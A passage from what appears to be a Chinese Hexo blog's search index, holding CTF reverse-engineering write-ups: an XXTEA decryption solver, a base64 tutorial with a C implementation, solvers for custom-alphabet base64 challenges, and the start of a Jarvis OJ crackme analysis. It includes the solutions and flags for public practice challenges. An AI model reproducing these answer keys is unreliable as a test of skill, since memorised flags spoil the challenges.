&#x3D; 6 + 52&#x2F;n;</span><br><span class="line">sum &#x3D; q*DELTA ;</span><br><span class="line">        while (sum !&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">    e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;n-1; p&gt;0; p--) </span><br><span class="line">&#123;</span><br><span class="line">z &#x3D; v[p-1];</span><br><span class="line">y &#x3D; v[p] -&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">            z &#x3D; v[n-1]; </span><br><span class="line">y &#x3D; v[0] -&#x3D; MX;</span><br><span class="line">sum -&#x3D; DELTA; </span><br><span class="line">&#125;</span><br><span class="line">        return 0; </span><br><span class="line">&#125;  </span><br><span class="line">return 1; </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">unsigned int k[4]&#x3D;&#123;1,2,3,4&#125;;</span><br><span class="line">int n&#x3D;26;</span><br><span class="line">btea(check, -n, k);</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;35;i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%c&quot;,check[i]);</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><blockquote><p>flag{xxtea_is_interesting}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base64在逆向中的应用</title>
      <link href="2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="base64的原理和C语言实现"><a href="#base64的原理和C语言实现" class="headerlink" title="base64的原理和C语言实现"></a>base64的原理和C语言实现</h1><a id="more"></a><p>原理参考此篇文章 <a href="https://blog.csdn.net/wo541075754/article/details/81734770">链接</a></p><p>C语言代码实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;math.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char table[65]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">char padding_char&#x3D;&#39;&#x3D;&#39;;</span><br><span class="line"></span><br><span class="line">int findchr(char *array,char ch)&#123;</span><br><span class="line">    for(int i&#x3D;0;i&lt;strlen(array);i++)&#123;</span><br><span class="line">        if(array[i]&#x3D;&#x3D;ch)&#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void base64_encode(char *src,char *result)&#123;</span><br><span class="line">    int fill_bit&#x3D;0;</span><br><span class="line">    int data_length;</span><br><span class="line">    int result_length;</span><br><span class="line">    int index;</span><br><span class="line">    _Bool full&#x3D;trunc;</span><br><span class="line">    data_length&#x3D;strlen(src);</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;length:%d\n&quot;,data_length);</span><br><span class="line">    fill_bit&#x3D;((3-strlen(src)%3)%3); &#x2F;&#x2F;计算未满字节，注意除去3的情况</span><br><span class="line">    for(int k&#x3D;0;k&lt;fill_bit;k++)&#123;</span><br><span class="line">        src[data_length+k]&#x3D;&#39;\0&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;data_length;i+&#x3D;3)&#123;</span><br><span class="line">        index&#x3D;src[i]&gt;&gt;2;</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;((src[i]&amp;3)&lt;&lt;4)+(src[i+1]&gt;&gt;4);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;((src[i+1]&amp;15)&lt;&lt;2)+(src[i+2]&gt;&gt;6);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;(src[i+2]&amp;63);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        &#x2F;&#x2F;&lt;&lt; &gt;&gt; 运算符的优先级低于+ -，注意加括号</span><br><span class="line">    &#125;</span><br><span class="line">    result_length&#x3D;strlen(result);</span><br><span class="line">    for(int k&#x3D;0;k&lt;fill_bit;k++)&#123;</span><br><span class="line">        result[result_length-1-k]&#x3D;padding_char; &#x2F;&#x2F;把多余的A字符替换为&#x3D;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void base64_decode(char *src,char *result)&#123;</span><br><span class="line">    int base_len;</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    base_len&#x3D;strlen(src);</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;length:%d\n&quot;,base_len);</span><br><span class="line">    for(int i&#x3D;0;i&lt;base_len;i++)&#123;</span><br><span class="line">        if(src[i]&#x3D;&#x3D;padding_char)</span><br><span class="line">            src[i]&#x3D;&#39;A&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;%s\n&quot;,src);</span><br><span class="line">    for(int i&#x3D;0;i&lt;base_len;i+&#x3D;4)&#123;</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i])&lt;&lt;2)+(findchr(table,src[i+1])&gt;&gt;4);</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i+1])&lt;&lt;4)+(findchr(table,src[i+2])&gt;&gt;2);</span><br><span class="line">        result[j++]&#x3D;((findchr(table,src[i+2])&amp;3)&lt;&lt;6)+(findchr(table,src[i+3]));</span><br><span class="line">        &#x2F;&#x2F;注意编码是table对应的编码，不是原来的ascii码</span><br><span class="line">        &#x2F;&#x2F;按位运算符优先级低于位移运算符，注意括号</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char words[100]&#x3D;&quot;abc&quot;;</span><br><span class="line">    char en_words[100]&#x3D;&quot;&quot;;</span><br><span class="line">    char de_words[100]&#x3D;&quot;&quot;;</span><br><span class="line">    base64_encode(words,en_words);</span><br><span class="line">    printf(&quot;encode:%s\n&quot;,en_words);</span><br><span class="line">    base64_decode(en_words,de_words);</span><br><span class="line">    printf(&quot;decode:%s\n&quot;,de_words);</span><br><span class="line">    return 0;</span><br><span class="line">    &#x2F;&#x2F;摘抄于https:&#x2F;&#x2F;eqqie.cn&#x2F;index.php&#x2F;laji_note&#x2F;785&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="base64在逆向中的应用"><a href="#base64在逆向中的应用" class="headerlink" title="base64在逆向中的应用"></a>base64在逆向中的应用</h1><h2 id="1-直接使用"><a href="#1-直接使用" class="headerlink" title="1.直接使用"></a>1.直接使用</h2><h3 id="flag为解密结果"><a href="#flag为解密结果" class="headerlink" title="flag为解密结果"></a>flag为解密结果</h3><p><a href="https://pan.baidu.com/s/1OekeF05h-IkH_16UZOaXQQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/1.PNG"></p><p>图中的flag为ZmxhZ3t5b3VfZ2V0X2l0fQ==，经base64解码得</p><blockquote><p>flag{you_get_it}</p></blockquote><h3 id="flag为加密结果"><a href="#flag为加密结果" class="headerlink" title="flag为加密结果"></a>flag为加密结果</h3><p><a href="https://pan.baidu.com/s/15KN694_td7Ds7xKnp8ussw">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/2.PNG"></p><p>图中的str也是ZmxhZ3t5b3VfZ2V0X2l0fQ==，经base64加密得</p><blockquote><p>flag：Wm14aFozdDViM1ZmWjJWMFgybDBmUT09</p></blockquote><h3 id="如何判断是加密还是解密"><a href="#如何判断是加密还是解密" class="headerlink" title="如何判断是加密还是解密"></a>如何判断是加密还是解密</h3><p>我们可以观察一下密码函数</p><blockquote><p>加密<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/3.PNG"><br>解密<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/4.PNG"></p></blockquote><p>可以发现，加密函数下有一个padding_char，点进去是一个‘=’，那这就是加密函数。<br>或者有‘&amp; 3’‘&amp; 0xf’‘&amp; 0x3f’‘= 61’,也是加密函数。<br>遇到此类题目时，大多数加密的。懒得分析也可以都试试，这也就是一会儿的时间。<br>最后的那个判断还可以和异或联系，注意一下就行，这里便不再举例，<br>下面的类型我只说加密，加密和解密的思路都是一样的。</p><h2 id="2-变化字母表"><a href="#2-变化字母表" class="headerlink" title="2.变化字母表"></a>2.变化字母表</h2><p>将base64原来的字母表改变顺序、位置得到新的加密结果。<br>有两种变化方式：1.直接改变；2.用函数改变</p><h3 id="直接改变"><a href="#直接改变" class="headerlink" title="直接改变"></a>直接改变</h3><p><a href="https://pan.baidu.com/s/1mE75zgqcVl2guLosEEiNwQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/5.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/6.PNG"></p><p>这一题的字母表改为了’0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/‘，根据这个字母表和原版字母表的差别，将密文修改为正确的密文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;pCNxpTJkq6AAnSAAnSpIg6tZ&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Thi$_i$_fl@g&#125;</span><br></pre></td></tr></table></figure><h3 id="用函数改变"><a href="#用函数改变" class="headerlink" title="用函数改变"></a>用函数改变</h3><p><a href="https://pan.baidu.com/s/1VpBPqjboo7Wm5yQCXZO1JA">附件链接</a> 提取码：0000<br>这个是调用一个外部函数改变密码表的顺序。</p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/7.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/8.PNG"></p><p>这种方式比直接改变复杂了一点点。但也不难。<br>这里用了两次waaaagh函数，另一次再base64_encode里，没有显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;tSdNt3ZouGQQr2QQr2tYkGx9&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    int n&#x3D;10;</span><br><span class="line">char ch;</span><br><span class="line">while(n&lt;40)</span><br><span class="line">&#123;</span><br><span class="line">ch&#x3D;b[n];</span><br><span class="line">b[n]&#x3D;b[n+10];</span><br><span class="line">b[n+10]&#x3D;ch;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">n&#x3D;10;</span><br><span class="line">while(n&lt;40)</span><br><span class="line">&#123;</span><br><span class="line">ch&#x3D;b[n];</span><br><span class="line">b[n]&#x3D;b[n+10];</span><br><span class="line">b[n+10]&#x3D;ch;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Thi$_i$_fl@g&#125;</span><br></pre></td></tr></table></figure><h1 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h1><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://buuoj.cn/challenges#[WUSTCTF2020]level3">题目链接</a><br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/9.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/10.PNG"></p><p>和上面的那题差不多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i,j,v0,result;</span><br><span class="line">char ch[]&#x3D;&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD&#x3D;&#x3D;&quot;;</span><br><span class="line">char base64_table[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">char base64_table1[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line"> for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">    v0 &#x3D; base64_table[i];</span><br><span class="line">    base64_table[i] &#x3D; base64_table[19 - i];</span><br><span class="line">    result &#x3D; 19 - i;</span><br><span class="line">    base64_table[result] &#x3D; v0;</span><br><span class="line">    &#125;</span><br><span class="line">for(i&#x3D;0;i&lt;strlen(ch);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(base64_table1);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(base64_table[j]&#x3D;&#x3D;ch[i])</span><br><span class="line">            &#123;</span><br><span class="line">                ch[i]&#x3D;base64_table1[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(ch);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,ch[i]);</span><br><span class="line">    &#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Base64_is_the_start_of_reverse}</p></blockquote><h2 id="usualCrypt"><a href="#usualCrypt" class="headerlink" title="usualCrypt"></a>usualCrypt</h2><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]usualCrypt">题目链接</a><br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/11.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/12.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/13.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/14.PNG"></p><p>这一题除了字母表的变化，还将密文的字母大小写交换了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;;</span><br><span class="line">    int i,j,v1;</span><br><span class="line">    int result &#x3D; 6;</span><br><span class="line">    for (i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">    if ( c[i] &gt;&#x3D; &#39;a&#39; &amp;&amp; c[i] &lt;&#x3D; &#39;z&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        c[i] -&#x3D; 32;</span><br><span class="line">    &#125;</span><br><span class="line">      else if ( c[i] &gt;&#x3D; &#39;A&#39; &amp;&amp; c[i] &lt;&#x3D; &#39;Z&#39; )</span><br><span class="line">      &#123;</span><br><span class="line">        c[i] +&#x3D; 32;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">      c[i] &#x3D; c[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; b[result+10];</span><br><span class="line">    b[result+10] &#x3D; b[result];</span><br><span class="line">    b[result++] &#x3D; v1;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( result &lt; 15 );</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{bAse64_h2s_a_Surprise}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ</title>
      <link href="2021/03/03/Jarvis-OJ/"/>
      <url>2021/03/03/Jarvis-OJ/</url>
      
        <content type="html"><![CDATA[<h1 id="stheasy"><a href="#stheasy" class="headerlink" title="stheasy"></a>stheasy</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1Ev7oxqScoIAP5-pb_ZKxdw">附件链接</a> 提取码：0000<br>放入ida32中，进入main函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+10h] [ebp-110h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input flag:&quot;);</span><br><span class="line">  sub_80485A0(&amp;s, 0x100u);</span><br><span class="line">  if ( sub_8048630(&amp;s) )</span><br><span class="line">    puts(&quot;Flag is right.&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Flag is wrong.&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看sub_8048630</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_8048630(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; &#x2F;&#x2F; eax</span><br><span class="line">  int v3; &#x2F;&#x2F; edx</span><br><span class="line"></span><br><span class="line">  if ( s )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; strlen(s);</span><br><span class="line">    if ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v1 &#x3D;&#x3D; 29 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 &#x3D; 0;</span><br><span class="line">        while ( s[v3] &#x3D;&#x3D; stru_8049AE0[(stru_8049B15[v3] &#x2F; 3u - 2)] )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( ++v3 &#x3D;&#x3D; 29 )</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要返回值为1，判断相等就行了。<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int 